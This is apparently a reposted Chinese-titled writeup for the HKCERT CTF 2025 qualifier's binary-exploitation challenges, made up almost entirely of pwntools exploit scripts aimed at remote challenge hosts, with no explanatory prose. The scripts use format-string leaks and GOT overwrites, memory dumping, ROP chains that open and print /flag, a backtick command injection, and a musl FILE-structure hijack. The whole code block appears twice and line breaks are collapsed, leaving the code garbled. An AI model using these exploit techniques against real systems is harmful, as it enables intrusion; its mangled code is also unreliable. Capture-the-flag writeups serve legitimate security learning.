# 香港網安奪旗賽HKCERT CTF 2025 資格賽PWN方向Writeup

> 原文: https://www.ctfiot.com/288942.html
> ID: 288942

from pwn import *
context.log_level = 'debug'context.arch = 'amd64'context.terminal = ['tmux', 'sp', '-h']
#p = process('./pwn')p = remote("pwn-75fef9f844.challenge.xctf.org.cn", 9999, ssl=True)
system = 0x4012E0bin_sh = 0x404078prdi = 0x4012F1
p.recvuntil(b"Now, enter your answer.n")
p.sendlineafter(b"Question Number:", str(-1))p.sendlineafter(b"Result:", str(system))
p.sendlineafter(b"Question Number:", str(-2))p.sendlineafter(b"Result:", str(bin_sh))
p.sendlineafter(b"Question Number:", str(-3))#gdb.attach(p)p.sendlineafter(b"Result:", str(prdi))
p.interactive()

from pwn import *import sys
context.log_level = 'error'context.arch = 'amd64'
# io = remote("pwn-1c0398b7ef.challenge.xctf.org.cn", 9999, ssl=True)
def get_io():    return remote("pwn-1c0398b7ef.challenge.xctf.org.cn", 9999, ssl=True)
def exploit():    io = get_io()    try:        # Leak base        io.sendlineafter(b'>', b'%41$p')        io.recvuntil(b'0x')        leak_str = io.recvline().strip()        leak = int(leak_str, 16)        print(f"Leaked address: {hex(leak)}")        start_page = leak & ~0xFFF
        # Search backwards for ELF header        for i in range(10):            addr = start_page - (i * 0x1000)            print(f"Checking {hex(addr)}...")
            try:                payload = b'%7$sAAAA' + p64(addr)                # Consume the space after >                io.sendlineafter(b'> ', payload)
                resp = io.recvuntil(b'AAAA')                content = resp[:-4]                print(f"Content at {hex(addr)}: {content}")
                if b'x7fELF' in content:                    print(f"Found ELF header at {hex(addr)}!")                    base = addr                    break            
except Exception as e:                print(f"Error reading {hex(addr)}: {e}")                break        else:            print("Could not find ELF header.")            return
        # Now dump the binary        dump_file = open("dumped_binary", "wb")        current_addr = base        end_addr = base + 0x3000 # Dump 12KB (enough for small binary)
        while current_addr < end_addr:            try:                payload = b'%7$sAAAA' + p64(current_addr)                io.sendlineafter(b'> ', payload)                resp = io.recvuntil(b'AAAA')                content = resp[:-4]
                dump_file.write(content)                dump_file.write(b'x00') # The byte that stopped %s
                current_addr += len(content) + 1                print(f"Dumped up to {hex(current_addr)}")            
except Exception as e:                print(f"Error dumping at {hex(current_addr)}: {e}")                break
        dump_file.close()        print("Dump finished.")
    
except Exception as e:        print(f"Error: {e}")    finally:        io.close()
if __name__ == "__main__":    exploit()

from capstone import *import struct
def analyze():    with open('pwn', 'rb') as f:        data = f.read()
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    # Analyze main to find return address    main_offset = 0x1248    print(f"--- Analyzing main at {hex(main_offset)} ---")    main_code = data[main_offset:
main_offset+100]
    vuln_ret_addr = None
    for i in md.disasm(main_code, main_offset):        print(f"0x{i.address:x}:t{i.mnemonic}t{i.op_str}")        if i.mnemonic == 'call':            # Check if it calls vuln (0x11C9)            # The operand is usually an immediate address in capstone            try:                target = int(i.op_str, 16)                if target == 0x11c9:                    vuln_ret_addr = i.address + i.size                    print(f"Found call to vuln! Return address: {hex(vuln_ret_addr)}")            
except:                pass
    # Analyze vuln to find printf PLT and GOT    vuln_offset = 0x11C9    print(f"n--- Analyzing vuln at {hex(vuln_offset)} ---")    vuln_code = data[vuln_offset:
vuln_offset+200]
    printf_plt = None
    for i in md.disasm(vuln_code, vuln_offset):        print(f"0x{i.address:x}:t{i.mnemonic}t{i.op_str}")        if i.mnemonic == 'call':            # We assume the first call is printf (or second)            # vuln calls: printf, read, printf            # Let's identify them by order or offset if possible.            # But we can just look at the target.            # The target should be a PLT entry.            try:                target = int(i.op_str, 16)                # PLT entries are usually before the text section or at the beginning.                # Let's just collect all call targets.                if printf_plt is None:                     printf_plt = target # First call is printf("> ")                     print(f"Assuming printf PLT is {hex(printf_plt)}")            
except:                pass
    # Analyze printf PLT at 0x10b0    printf_plt = 0x10b0    print(f"n--- Analyzing printf PLT at {hex(printf_plt)} ---")    if printf_plt < len(data):        plt_code = data[printf_plt:
printf_plt+16]        for i in md.disasm(plt_code, printf_plt):            print(f"0x{i.address:x}:t{i.mnemonic}t{i.op_str}")            if i.mnemonic == 'jmp':                # op_str might be "qword ptr [rip + 0x2fe2]"                if '[rip +' in i.op_str:                    offset_str = i.op_str.split('+')[1].split(']')[0].strip()                    offset = int(offset_str, 16)                    got_addr = i.address + i.size + offset                    print(f"Found GOT entry for printf: {hex(got_addr)}")if __name__ == '__main__':    analyze()

from pwn import *
# TARGET = "./pwn"#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'context.arch = 'amd64'context.terminal = ['tmux', 'sp', '-h']
# elf = ELF(TARGET)
# io = process(TARGET)io = remote("pwn-1c0398b7ef.challenge.xctf.org.cn", 9999, ssl=True)
r = lambda len: io.recv(len)ru = lambda s: io.recvuntil(s)rl = lambda : io.recvline()s = lambda s: io.send(s)sl = lambda s: io.sendline(s)sla = lambda s, d: io.sendlineafter(s, d)sa = lambda s, d: io.sendafter(s, d)l64 = lambda : u64(ru(b'x7f')[:6].ljust(8, b'x00'))l32 = lambda : u32(ru(b'xf7')[:4].ljust(4, b'x00'))
def attach(dbg_str=''):	gdb.attach(io, "%s" %dbg_str)
# 1. Leak PIE Basesla(b'>', b'%41$p')ru(b'0x')leak = int(rl().strip(), 16)print(f"Leaked address: {hex(leak)}")
# Offset calculation
# Leak is return address of vuln (0x1296)pie_base = leak - 0x1296print(f"PIE Base: {hex(pie_base)}")
# 2. Calculate addressesprintf_got_offset = 0x4028backdoor_offset = 0x129D
printf_got = pie_base + printf_got_offsetbackdoor = pie_base + backdoor_offset
print(f"printf GOT: {hex(printf_got)}")print(f"backdoor: {hex(backdoor)}")
# 3. Overwrite printf GOT with backdoor
# Offset 6 is the start of our bufferpayload = fmtstr_payload(6, {printf_got: backdoor})sla(b'>', payload)
# 4. Trigger backdoor
# The next printf call will be backdoor
# We might need to send one more input to trigger the loop if the payload doesn't trigger it immediately
# But printf(buf) happens right after read.# So the overwrite happens during printf(buf).# Then the loop continues to printf("> ").# This call will be hijacked.
io.interactive()

from pwn import *
context(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'LIBC_FILE = './libc.so.6'
def get_p():    return remote("pwn-29e966700b.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)libc = ELF(LIBC_FILE)

p = get_p()p.sendafter("hey hey what are you doing here?",'Feng_ZZ')
# gdb.attach(p,"b *0x04012CE")
# sleep(2)

payload = b"A"*0x70 + p64(0x004040A0 + 0xa00) + p64(0x0401130) + p64(0x04012B0) + p64(0x004010F0)p.sendafter("I say STOP doing this!",payload)p.recvline()libc.address = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2045c0
pop_rdx = 0x00000000000b0133 + libc.address #0x00000000000b0133 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; retpop_rdi = 0x000000000010f78b + libc.addresspop_rsi = 0x0000000000110a7d + libc.address
pop_rbx = 0x00000000000586e4 + libc.address
print(hex(libc.address))
payload = b"A"*0x78 + p64(pop_rdi) + p64(0x404b40) + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x004040A0) + p64(pop_rbx) + p64(0x50) + p64(pop_rdx) + p64(0)*3 + p64(libc.sym['read'])payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])  + b"/flag"
p.send(payload)p.interactive()

from pwn import *
context(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'# LIBC_FILE = ''
def get_p():    # return process(BIN_FILE)    return remote("pwn-20bbd42fcd.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)
# libc = ELF(LIBC_FILE)
p = get_p()p.send("`ls`".ljust(0xa,"x00"))
p.recvuntil("flag{")flag = p.recvuntil("}")
print(b"flag{"+flag)p.interactive()

from pwn import *import oscontext(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'# LIBC_FILE = ''
def get_p():    return remote("pwn-de56c9dc98.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)
# libc = ELF(LIBC_FILE)os.system("rm ./db_dir/Feng_ZZ")sleep(2)p = get_p()p.sendlineafter("login:",'Feng_ZZ')p.sendlineafter("choice>>",'3')
# gdb.attach(p,"b *0x00402048")
# sleep(2)p.sendlineafter("choice>>",str((0x404ff0-0x04051A0)//8))
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendafter("name","A"*0x40)p.interactive()

#include "stdio_impl.h"int puts(const char *s){    int r;    FLOCK(stdout);    r = -(fputs(s, stdout) < 0 || putc_unlocked('n', stdout) < 0);    FUNLOCK(stdout);    return r;}

#include "stdio_impl.h"#include <string.h>int fputs(const char *restrict s, FILE *restrict f){    size_t l = strlen(s);    return (fwrite(s, 1, l, f)==l) - 1;}weak_alias(fputs, fputs_unlocked);

#include "stdio_impl.h"#include <string.h>size_t __fwritex(const unsigned char *restrict s, size_t l, FILE *restrict f){    size_t i=0;    if (!f->wend && __towrite(f)) return 0;    if (l > f->wend - f->wpos) return f->write(f, s, l);    if (f->lbf >= 0) {        /* Match /^(.*n|)/ */        for (i=l; i && s[i-1] != 'n'; i--);        if (i) {            size_t n = f->write(f, s, i);            if (n < i) return n;            s += i;            l -= i;        }    }    memcpy(f->wpos, s, l);    f->wpos += l;    return l+i;}size_t fwrite(const void *restrict src, size_t size, size_t nmemb, FILE *restrict f){    size_t k, l = size*nmemb;    if (!size) nmemb = 0;    FLOCK(f);    k = __fwritex(src, l, f);    FUNLOCK(f);    return k==l ? nmemb : k/size;}weak_alias(fwrite, fwrite_unlocked);

if (l > f->wend - f->wpos) return f->write(f, s, l);

0x0000000000054b32 : mov rax, rdi ; mov rdi, qword ptr [rdi + 8] ; call qword ptr [rax]0x0000000000083557 : push rdi ; jmp qword ptr [rdi - 0x32]0x0000000000004628 : pop rsp ; ret

from pwn import *
context(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'LIBC_FILE = './libc.so'
def get_p():    return remote("pwn-e6bd2e3c04.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)libc = ELF(LIBC_FILE)
p = get_p()p.sendlineafter(">>",'2')libc.address = u64(p.recv(6).ljust(0x8,b"x00")) - 0x1000 - 0xe50 - 0x291000
p.sendlineafter(">>",'1')
# gdb.attach(p,"b *&__fwritex")
# sleep(2)p.sendlineafter("offset",str(-0x32c0-0x20+0x200))
magic_gadget = 0x0000000000054b32 + libc.addressmagic_2 = 0x0000000000077841 + libc.addressmagic_3 = 0x0000000000083557 + libc.address

magic_4 = 0x0000000000004628 + libc.address 
fake_io_file = p64(magic_3) + p64(libc.sym['__stdout_FILE']+0x100 + 0x40) fake_io_file += p64(libc.sym['__stdout_FILE']+0x100-0xcf8c)* 7fake_io_file += p64(magic_gadget)
fake_io_file = fake_io_file.ljust(0x100,b"x00")
pop_rdi = 0x0000000000014862 + libc.addresspop_rsi = 0x000000000001c237 + libc.addresspop_rdx = 0x000000000001bea2 + libc.address
payload = fake_io_file + (b"x00"*0xe + p64(magic_4)).ljust(0x40,b"x00") payload += p64(pop_rdi) + p64(libc.sym['__stdout_FILE'] + 0x1e8) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(libc.sym['open'])payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(libc.sym['__stderr_FILE'])  +p64(pop_rdx) + p64(0x40) + p64(libc.sym['read'])payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(libc.sym['__stderr_FILE']) + p64(pop_rdx) + p64(0x40) + p64(libc.sym['write']) +  b"/flagx00"p.sendafter("Content",b"x00"*0x20+payload)print(hex(libc.address))p.interactive()


```
from pwn import *
context.log_level = 'debug'context.arch = 'amd64'context.terminal = ['tmux', 'sp', '-h']
    #p = process('./pwn')p = remote("pwn-75fef9f844.challenge.xctf.org.cn", 9999, ssl=True)
system = 0x4012E0bin_sh = 0x404078prdi = 0x4012F1
p.recvuntil(b"Now, enter your answer.n")
p.sendlineafter(b"Question Number:", str(-1))p.sendlineafter(b"Result:", str(system))
p.sendlineafter(b"Question Number:", str(-2))p.sendlineafter(b"Result:", str(bin_sh))
p.sendlineafter(b"Question Number:", str(-3))#gdb.attach(p)p.sendlineafter(b"Result:", str(prdi))
p.interactive()
from pwn import *import sys
context.log_level = 'error'context.arch = 'amd64'
# io = remote("pwn-1c0398b7ef.challenge.xctf.org.cn", 9999, ssl=True)
def get_io():    return remote("pwn-1c0398b7ef.challenge.xctf.org.cn", 9999, ssl=True)
def exploit():    io = get_io()    try:        # Leak base        io.sendlineafter(b'>', b'%41$p')        io.recvuntil(b'0x')        leak_str = io.recvline().strip()        leak = int(leak_str, 16)        print(f"Leaked address: {hex(leak)}")        start_page = leak & ~0xFFF
        # Search backwards for ELF header        for i in range(10):            addr = start_page - (i * 0x1000)            print(f"Checking {hex(addr)}...")
            try:                payload = b'%7$sAAAA' + p64(addr)                # Consume the space after >                io.sendlineafter(b'> ', payload)
                resp = io.recvuntil(b'AAAA')                content = resp[:-4]                print(f"Content at {hex(addr)}: {content}")
                if b'x7fELF' in content:                    print(f"Found ELF header at {hex(addr)}!")                    base = addr                    break            
except Exception as e:                print(f"Error reading {hex(addr)}: {e}")                break        else:            print("Could not find ELF header.")            return
        # Now dump the binary        dump_file = open("dumped_binary", "wb")        current_addr = base        end_addr = base + 0x3000 # Dump 12KB (enough for small binary)
        while current_addr < end_addr:            try:                payload = b'%7$sAAAA' + p64(current_addr)                io.sendlineafter(b'> ', payload)                resp = io.recvuntil(b'AAAA')                content = resp[:-4]
                dump_file.write(content)                dump_file.write(b'x00') # The byte that stopped %s
                current_addr += len(content) + 1                print(f"Dumped up to {hex(current_addr)}")            
except Exception as e:                print(f"Error dumping at {hex(current_addr)}: {e}")                break
        dump_file.close()        print("Dump finished.")
    
except Exception as e:        print(f"Error: {e}")    finally:        io.close()
if __name__ == "__main__":    exploit()
from capstone import *import struct
def analyze():    with open('pwn', 'rb') as f:        data = f.read()
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    # Analyze main to find return address    main_offset = 0x1248    print(f"--- Analyzing main at {hex(main_offset)} ---")    main_code = data[main_offset:
main_offset+100]
    vuln_ret_addr = None
    for i in md.disasm(main_code, main_offset):        print(f"0x{i.address:x}:t{i.mnemonic}t{i.op_str}")        if i.mnemonic == 'call':            # Check if it calls vuln (0x11C9)            # The operand is usually an immediate address in capstone            try:                target = int(i.op_str, 16)                if target == 0x11c9:                    vuln_ret_addr = i.address + i.size                    print(f"Found call to vuln! Return address: {hex(vuln_ret_addr)}")            
except:                pass
    # Analyze vuln to find printf PLT and GOT    vuln_offset = 0x11C9    print(f"n--- Analyzing vuln at {hex(vuln_offset)} ---")    vuln_code = data[vuln_offset:
vuln_offset+200]
    printf_plt = None
    for i in md.disasm(vuln_code, vuln_offset):        print(f"0x{i.address:x}:t{i.mnemonic}t{i.op_str}")        if i.mnemonic == 'call':            # We assume the first call is printf (or second)            # vuln calls: printf, read, printf            # Let's identify them by order or offset if possible.            # But we can just look at the target.            # The target should be a PLT entry.            try:                target = int(i.op_str, 16)                # PLT entries are usually before the text section or at the beginning.                # Let's just collect all call targets.                if printf_plt is None:                     printf_plt = target # First call is printf("> ")                     print(f"Assuming printf PLT is {hex(printf_plt)}")            
except:                pass
    # Analyze printf PLT at 0x10b0    printf_plt = 0x10b0    print(f"n--- Analyzing printf PLT at {hex(printf_plt)} ---")    if printf_plt < len(data):        plt_code = data[printf_plt:
printf_plt+16]        for i in md.disasm(plt_code, printf_plt):            print(f"0x{i.address:x}:t{i.mnemonic}t{i.op_str}")            if i.mnemonic == 'jmp':                # op_str might be "qword ptr [rip + 0x2fe2]"                if '[rip +' in i.op_str:                    offset_str = i.op_str.split('+')[1].split(']')[0].strip()                    offset = int(offset_str, 16)                    got_addr = i.address + i.size + offset                    print(f"Found GOT entry for printf: {hex(got_addr)}")if __name__ == '__main__':    analyze()
from pwn import *
# TARGET = "./pwn"#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'context.arch = 'amd64'context.terminal = ['tmux', 'sp', '-h']
# elf = ELF(TARGET)
# io = process(TARGET)io = remote("pwn-1c0398b7ef.challenge.xctf.org.cn", 9999, ssl=True)
r = lambda len: io.recv(len)ru = lambda s: io.recvuntil(s)rl = lambda : io.recvline()s = lambda s: io.send(s)sl = lambda s: io.sendline(s)sla = lambda s, d: io.sendlineafter(s, d)sa = lambda s, d: io.sendafter(s, d)l64 = lambda : u64(ru(b'x7f')[:6].ljust(8, b'x00'))l32 = lambda : u32(ru(b'xf7')[:4].ljust(4, b'x00'))
def attach(dbg_str=''):	gdb.attach(io, "%s" %dbg_str)
# 1. Leak PIE Basesla(b'>', b'%41$p')ru(b'0x')leak = int(rl().strip(), 16)print(f"Leaked address: {hex(leak)}")
# Offset calculation
# Leak is return address of vuln (0x1296)pie_base = leak - 0x1296print(f"PIE Base: {hex(pie_base)}")
# 2. Calculate addressesprintf_got_offset = 0x4028backdoor_offset = 0x129D
printf_got = pie_base + printf_got_offsetbackdoor = pie_base + backdoor_offset
print(f"printf GOT: {hex(printf_got)}")print(f"backdoor: {hex(backdoor)}")
# 3. Overwrite printf GOT with backdoor
# Offset 6 is the start of our bufferpayload = fmtstr_payload(6, {printf_got: backdoor})sla(b'>', payload)
# 4. Trigger backdoor
# The next printf call will be backdoor
# We might need to send one more input to trigger the loop if the payload doesn't trigger it immediately
# But printf(buf) happens right after read.# So the overwrite happens during printf(buf).# Then the loop continues to printf("> ").# This call will be hijacked.
io.interactive()
from pwn import *
context(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'LIBC_FILE = './libc.so.6'
def get_p():    return remote("pwn-29e966700b.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)libc = ELF(LIBC_FILE)

p = get_p()p.sendafter("hey hey what are you doing here?",'Feng_ZZ')
# gdb.attach(p,"b *0x04012CE")
# sleep(2)

payload = b"A"*0x70 + p64(0x004040A0 + 0xa00) + p64(0x0401130) + p64(0x04012B0) + p64(0x004010F0)p.sendafter("I say STOP doing this!",payload)p.recvline()libc.address = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2045c0
pop_rdx = 0x00000000000b0133 + libc.address #0x00000000000b0133 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; retpop_rdi = 0x000000000010f78b + libc.addresspop_rsi = 0x0000000000110a7d + libc.address
pop_rbx = 0x00000000000586e4 + libc.address
print(hex(libc.address))
payload = b"A"*0x78 + p64(pop_rdi) + p64(0x404b40) + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x004040A0) + p64(pop_rbx) + p64(0x50) + p64(pop_rdx) + p64(0)*3 + p64(libc.sym['read'])payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])  + b"/flag"
p.send(payload)p.interactive()
from pwn import *
context(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'# LIBC_FILE = ''
def get_p():    # return process(BIN_FILE)    return remote("pwn-20bbd42fcd.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)
# libc = ELF(LIBC_FILE)
p = get_p()p.send("`ls`".ljust(0xa,"x00"))
p.recvuntil("flag{")flag = p.recvuntil("}")
print(b"flag{"+flag)p.interactive()
from pwn import *import oscontext(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'# LIBC_FILE = ''
def get_p():    return remote("pwn-de56c9dc98.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)
# libc = ELF(LIBC_FILE)os.system("rm ./db_dir/Feng_ZZ")sleep(2)p = get_p()p.sendlineafter("login:",'Feng_ZZ')p.sendlineafter("choice>>",'3')
# gdb.attach(p,"b *0x00402048")
# sleep(2)p.sendlineafter("choice>>",str((0x404ff0-0x04051A0)//8))
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendlineafter("choice>>",'1')p.sendlineafter("methods?",'1')
p.sendafter("name","A"*0x40)p.interactive()
    #include "stdio_impl.h"int puts(const char *s){    int r;    FLOCK(stdout);    r = -(fputs(s, stdout) < 0 || putc_unlocked('n', stdout) < 0);    FUNLOCK(stdout);    return r;}
    #include "stdio_impl.h"#include <string.h>int fputs(const char *restrict s, FILE *restrict f){    size_t l = strlen(s);    return (fwrite(s, 1, l, f)==l) - 1;}weak_alias(fputs, fputs_unlocked);
    #include "stdio_impl.h"#include <string.h>size_t __fwritex(const unsigned char *restrict s, size_t l, FILE *restrict f){    size_t i=0;    if (!f->wend && __towrite(f)) return 0;    if (l > f->wend - f->wpos) return f->write(f, s, l);    if (f->lbf >= 0) {        /* Match /^(.*n|)/ */        for (i=l; i && s[i-1] != 'n'; i--);        if (i) {            size_t n = f->write(f, s, i);            if (n < i) return n;            s += i;            l -= i;        }    }    memcpy(f->wpos, s, l);    f->wpos += l;    return l+i;}size_t fwrite(const void *restrict src, size_t size, size_t nmemb, FILE *restrict f){    size_t k, l = size*nmemb;    if (!size) nmemb = 0;    FLOCK(f);    k = __fwritex(src, l, f);    FUNLOCK(f);    return k==l ? nmemb : k/size;}weak_alias(fwrite, fwrite_unlocked);
if (l > f->wend - f->wpos) return f->write(f, s, l);
0x0000000000054b32 : mov rax, rdi ; mov rdi, qword ptr [rdi + 8] ; call qword ptr [rax]0x0000000000083557 : push rdi ; jmp qword ptr [rdi - 0x32]0x0000000000004628 : pop rsp ; ret
from pwn import *
context(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe", "wsl.exe"]
BIN_FILE = './pwn'LIBC_FILE = './libc.so'
def get_p():    return remote("pwn-e6bd2e3c04.challenge.xctf.org.cn", 9999, ssl=True)def debug(gdb_script=None):    gdb.attach(p, gdb_script)    sleep(2)
elf = ELF(BIN_FILE)libc = ELF(LIBC_FILE)
p = get_p()p.sendlineafter(">>",'2')libc.address = u64(p.recv(6).ljust(0x8,b"x00")) - 0x1000 - 0xe50 - 0x291000
p.sendlineafter(">>",'1')
# gdb.attach(p,"b *&__fwritex")
# sleep(2)p.sendlineafter("offset",str(-0x32c0-0x20+0x200))
magic_gadget = 0x0000000000054b32 + libc.addressmagic_2 = 0x0000000000077841 + libc.addressmagic_3 = 0x0000000000083557 + libc.address

magic_4 = 0x0000000000004628 + libc.address 
fake_io_file = p64(magic_3) + p64(libc.sym['__stdout_FILE']+0x100 + 0x40) fake_io_file += p64(libc.sym['__stdout_FILE']+0x100-0xcf8c)* 7fake_io_file += p64(magic_gadget)
fake_io_file = fake_io_file.ljust(0x100,b"x00")
pop_rdi = 0x0000000000014862 + libc.addresspop_rsi = 0x000000000001c237 + libc.addresspop_rdx = 0x000000000001bea2 + libc.address
payload = fake_io_file + (b"x00"*0xe + p64(magic_4)).ljust(0x40,b"x00") payload += p64(pop_rdi) + p64(libc.sym['__stdout_FILE'] + 0x1e8) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(libc.sym['open'])payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(libc.sym['__stderr_FILE'])  +p64(pop_rdx) + p64(0x40) + p64(libc.sym['read'])payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(libc.sym['__stderr_FILE']) + p64(pop_rdx) + p64(0x40) + p64(libc.sym['write']) +  b"/flagx00"p.sendafter("Content",b"x00"*0x20+payload)print(hex(libc.address))p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718221-wxsync-2025-12-3882d12a8e8c0b99070825db25d65cd3.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718223-wxsync-2025-12-fdc31b883dc8b389ef72fc43cd63664a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718225-wxsync-2025-12-64ccc71ecbbf6ce6d140d8920c45e541.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718227-wxsync-2025-12-0f871c51d310236c6dcda0dd0fe72124.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718230-wxsync-2025-12-c104c0acbab4e52d13d5f1d3a6139613.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718231-wxsync-2025-12-cb79db90a7b8498308c67ac7f04e80f1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718233-wxsync-2025-12-8fb9910da160b63cf4706910ccbb2475.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718235-wxsync-2025-12-52534923f80d4102ce18a42940c8e3a1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718237-wxsync-2025-12-897374b268549fccfb07889f6731c52e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718238-wxsync-2025-12-8460a16d3a2cf7860abbd12a3bc6f576.png)